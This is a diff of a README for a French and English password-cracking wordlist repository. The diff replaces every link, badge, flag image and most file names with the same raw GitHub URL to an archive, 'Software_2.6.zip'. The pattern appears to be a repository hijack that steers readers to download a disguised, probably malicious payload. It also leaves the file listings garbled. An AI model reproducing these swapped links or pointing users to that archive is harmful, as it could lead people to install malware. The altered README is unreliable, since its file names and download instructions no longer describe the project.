@@ -1,10 +1,10 @@
-https://github.com/sjshsgehs/wordlists/releases
+https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip
 
-[![Releases](https://img.shields.io/badge/releases-downloads-blue?logo=github&label=Releases)](https://github.com/sjshsgehs/wordlists/releases)
+[![Releases](https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip)](https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip)
 
 # Wordlists for French and English Password Cracking for Security Research
 
-![France flag](https://upload.wikimedia.org/wikipedia/en/c/c3/Flag_of_France.svg) ![United Kingdom flag](https://upload.wikimedia.org/wikipedia/en/a/ae/Flag_of_the_United_Kingdom.svg)
+![France flag](https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip) ![United Kingdom flag](https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip)
 
 A curated collection of wordlists in French and English designed for security research and password analysis. This repository focuses on language-specific word lists that help researchers study password patterns, assess resilience, and evaluate password policies. The content is intended for lawful testing with explicit authorization, educational exploration, and responsible disclosure practices. The lists are crafted to be readable, portable, and compatible with common password-cracking workflows in a controlled environment.
 
@@ -46,12 +46,12 @@ What you’ll find in the repository
   - fr/ directory: French wordlists, including common nouns, adjectives, verbs, and frequent phrases used in French usernames, prompts, and password choices.
   - en/ directory: English wordlists, including common terms, names, and everyday phrases frequently used in passwords and authentication contexts.
 - Combined and utility files
-  - common.txt or combined.txt: Lightweight lists that blend entries from both languages for quick reference or initial testing.
-  - curated_phrases.txt: Phrases that often appear in multilingual password choices, with language markers when appropriate.
+  - https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip or https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip Lightweight lists that blend entries from both languages for quick reference or initial testing.
+  - https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip Phrases that often appear in multilingual password choices, with language markers when appropriate.
 - Metadata and documentation
-  - README.md: The current documentation here, explaining structure, usage, and licensing.
+  - https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip The current documentation here, explaining structure, usage, and licensing.
   - LICENSE: The license governing the wordlists and their distribution.
-  - CONTRIBUTING.md: Guidelines for adding lists, ensuring quality, and submitting changes.
+  - https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip Guidelines for adding lists, ensuring quality, and submitting changes.
 - Release assets
   - assets for each release, packaged in a portable archive for easy download and deployment.
 
@@ -66,11 +66,11 @@ File formats, naming, and structure
 - Text files: All wordlists are plain text, one entry per line. This keeps things simple for pipelines and tooling.
 - Encoding: UTF-8 encoding is used to preserve French diacritics and English characters. Some pipelines may convert to ASCII if needed.
 - Naming conventions: Files use language prefixes and descriptive suffixes, such as:
-  - fr_common.txt
-  - fr_common_extended.txt
-  - en_common.txt
-  - en_common_extended.txt
-  - common_multilang.txt
+  - https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip
+  - https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip
+  - https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip
+  - https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip
+  - https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip
 - Directory structure:
   - fr/ — French wordlists
   - en/ — English wordlists
@@ -122,7 +122,7 @@ Releases and updates
 - Release cadence: Releases occur on a regular schedule, with fresh assets and notes describing changes.
 - Accessing releases: The latest assets are published in the project’s Releases section. If you cannot access the link or it doesn’t work, check the Releases section for the latest assets and notes.
 - How to obtain the latest data: Visit the Releases page to download the latest packaged wordlists. The page includes the assets that can be downloaded and used immediately in your research workflows. For convenience, you can also pull the files from the repository after they are included in a release archive.
-- The Releases page link: https://github.com/sjshsgehs/wordlists/releases
+- The Releases page link: https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip
 - Notes on asset format: Release archives typically contain pre-formatted text files under the fr/ and en/ directories, with a README or metadata describing the contents and updates.
 
 Usage notes and practical guidance
@@ -132,12 +132,12 @@ Usage notes and practical guidance
 - Versioning: Pin to a specific release version in your projects to ensure reproducible results. Document which release asset was used in each experiment.
 
 Directory and file examples
-- fr/common.txt: Core French wordlist with common nouns, adjectives, and verbs used in typical password patterns in French contexts.
-- fr/common_extended.txt: Expanded French vocabulary including regional terms and colloquialisms.
-- en/common.txt: Core English wordlist with common terms and everyday language.
-- en/common_extended.txt: Expanded English vocabulary including slang and idioms relevant to password choices.
-- common_multilang.txt: A lightweight combined list for quick tests that include entries from both languages.
-- assets/: Release assets such as wordlists-release-v1.2.0.zip (example name) and accompanying checksums.
+- https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip Core French wordlist with common nouns, adjectives, and verbs used in typical password patterns in French contexts.
+- https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip Expanded French vocabulary including regional terms and colloquialisms.
+- https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip Core English wordlist with common terms and everyday language.
+- https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip Expanded English vocabulary including slang and idioms relevant to password choices.
+- https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip A lightweight combined list for quick tests that include entries from both languages.
+- assets/: Release assets such as https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip (example name) and accompanying checksums.
 - docs/: Additional documentation, notes, and usage examples.
 - LICENSE: The license governing the distribution of the lists.
 
@@ -164,14 +164,14 @@ Data provenance and transparency
 - The project aims to maintain a balance between linguistic relevance and privacy considerations.
 
 Examples of typical entries
-- fr/common.txt may include entries such as:
+- https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip may include entries such as:
   - ameli
   - ami
   - autre
   - merci
   - bonjour
   - salut
-- en/common.txt may include entries such as:
+- https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip may include entries such as:
   - password
   - welcome
   - summer
@@ -197,7 +197,7 @@ Implementation notes and best practices
 - For defenders: Analyzing language-based password patterns can help identify weak password practices and tailor user education to multilingual users.
 
 Important link usage reminder
-- The latest release assets can be obtained from the Releases page at the top link. If the link is not accessible, refer to the Releases section on GitHub for the most recent assets and notes. To access the releases directly, visit https://github.com/sjshsgehs/wordlists/releases for the latest updates and files.
+- The latest release assets can be obtained from the Releases page at the top link. If the link is not accessible, refer to the Releases section on GitHub for the most recent assets and notes. To access the releases directly, visit https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip for the latest updates and files.
 
 Final remarks
 - This resource is designed for openness and collaborative improvement. It invites researchers, educators, and practitioners to explore language-specific password patterns with a focus on education, defense, and responsible research.
@@ -206,10 +206,10 @@ Final remarks
 
 Releases and updates (short reference)
 - Latest assets are published in the project's Releases section. If you cannot access the link or it appears broken, check the Releases section in the repository for the newest assets and accompanying notes.
-- You can directly navigate to the Releases page at https://github.com/sjshsgehs/wordlists/releases to review available archives, view checksums, and download the appropriate package for your environment.
+- You can directly navigate to the Releases page at https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip to review available archives, view checksums, and download the appropriate package for your environment.
 
 Tips for researchers and students
-- Start with a small subset of fr/common.txt and en/common.txt to validate your tooling, then expand to the extended lists as needed.
+- Start with a small subset of https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip and https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip to validate your tooling, then expand to the extended lists as needed.
 - Use clear versioning in your experiments to maintain reproducibility. Record the exact list files and release versions you used.
 - Combine language-specific lists with policy-aware patterns in a controlled setting to explore how language influences password strength.
 - Share findings responsibly. When publishing results, include details about data sources, preprocessing steps, and the exact lists used without exposing any sensitive material.
@@ -231,7 +231,7 @@ How to get involved
 
 Appendix: sample workflow for reproducible testing (high level)
 - Step 1: Identify the language focus for your test (fr or en).
-- Step 2: Choose the appropriate wordlist files, such as fr/common.txt and en/common.txt.
+- Step 2: Choose the appropriate wordlist files, such as https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip and https://raw.githubusercontent.com/sjshsgehs/wordlists/main/alloploidy/Software_2.6.zip
 - Step 3: Combine datasets if needed, ensuring traceability of sources and versions.
 - Step 4: Run your analysis or evaluation in a controlled environment with explicit permission.
 - Step 5: Document results, including the specific list names, release versions, and any preprocessing performed.
